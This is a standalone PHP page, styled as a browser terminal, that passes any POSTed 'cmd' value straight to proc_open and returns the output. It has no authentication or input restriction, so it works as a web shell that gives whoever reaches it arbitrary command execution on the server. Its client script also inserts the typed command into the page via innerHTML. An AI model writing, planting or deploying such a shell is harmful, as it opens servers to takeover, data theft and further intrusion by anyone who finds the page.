<?php
/**
 * Web-based PHP CLI Terminal
 * A standalone script for remote command execution.
 */

$TIMEOUT_SECONDS = 120; // Maximum time a command is allowed to run.

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    if ($cmd === 'logout') {
        session_destroy();
        die("LOGOUT_SUCCESS");
    }

    $output = '';
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin
       1 => array("pipe", "w"),  // stdout
       2 => array("pipe", "w")   // stderr
    );

    $process = proc_open($cmd . ' 2>&1', $descriptorspec, $pipes);

    if (is_resource($process)) {
        // Set non-blocking mode for the output pipe
        stream_set_blocking($pipes[1], 0);
        
        $start_time = time();
        $output = '';
        
        while (true) {
            $chunk = fread($pipes[1], 4096);
            if ($chunk !== false) {
                $output .= $chunk;
            }

            $status = proc_get_status($process);
            if (!$status['running']) {
                break;
            }

            // Check for timeout
            if (time() - $start_time > $TIMEOUT_SECONDS) {
                proc_terminate($process, 9); // Force kill (SIGKILL)
                $output .= "\n[Execution Timed Out after {$TIMEOUT_SECONDS}s]";
                break;
            }

            usleep(50000); // 50ms sleep to avoid CPU spinning
        }

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    } else {
        $output = "Error: Could not execute command.";
    }

    echo htmlspecialchars($output);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web-PHP-CLI</title>
    <style>
        body { background-color: #0c0c0c; color: #cccccc; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
        #terminal { background-color: #000; border: 1px solid #333; padding: 15px; border-radius: 4px; box-shadow: 0 0 15px rgba(0,0,0,0.5); min-height: 400px; display: flex; flex-direction: column; }
        #output { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; margin-bottom: 10px; word-break: break-all; }
        #input-line { display: flex; align-items: center; }
        #prompt { color: #0f0; margin-right: 10px; font-weight: bold; }
        #cmd-input { background: transparent; border: none; color: #0f0; outline: none; flex-grow: 1; font-family: inherit; font-size: 16px; }
        .history-cmd { color: #555; font-style: italic; }
        .error { color: #f00; }
        .timestamp { color: #888; font-size: 0.8em; margin-right: 5px; }
        h1 { font-size: 1.2em; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; color: #eee; }
    </style>
</head>
<body>
    <h1>Web-based PHP CLI Terminal</h1>
    <div id="terminal">
        <div id="output">Welcome to Web-CLI. Type 'help' for info.
---
</div>
        <div id="input-line">
            <span id="prompt"><?php echo get_current_user() . '@' . $_SERVER['SERVER_NAME']; ?>:~$</span>
            <input type="text" id="cmd-input" autofocus autocomplete="off">
        </div>
    </div>

    <script>
        const output = document.getElementById('output');
        const input = document.getElementById('cmd-input');
        const history = [];
        let historyIndex = -1;

        function appendOutput(text, isError = false) {
            const div = document.createElement('div');
            if (isError) div.className = 'error';
            
            const time = new Date().toLocaleTimeString();
            div.innerHTML = `<span class="timestamp">[${time}]</span>${text}`;
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        }

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const cmd = input.value.trim();
                if (!cmd) return;

                appendOutput(`<span class="history-cmd">> ${cmd}</span>`);
                input.value = '';
                
                if (cmd === 'clear') {
                    output.innerHTML = '';
                    return;
                }

                if (cmd === 'help') {
                    appendOutput('Available commands: All system commands accessible to PHP user. Special: clear, logout.');
                    return;
                }

                history.push(cmd);
                historyIndex = history.length;

                fetch('', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=' + encodeURIComponent(cmd)
                })
                .then(res => res.text())
                .then(data => {
                    if (data === 'LOGOUT_SUCCESS') {
                        window.location.reload();
                    } else {
                        appendOutput(data || '(No output)');
                    }
                })
                .catch(err => appendOutput('Network Error: ' + err, true));

            } else if (e.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = history[historyIndex];
                }
                e.preventDefault();
            } else if (e.key === 'ArrowDown') {
                if (historyIndex < history.length - 1) {
                    historyIndex++;
                    input.value = history[historyIndex];
                } else {
                    historyIndex = history.length;
                    input.value = '';
                }
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
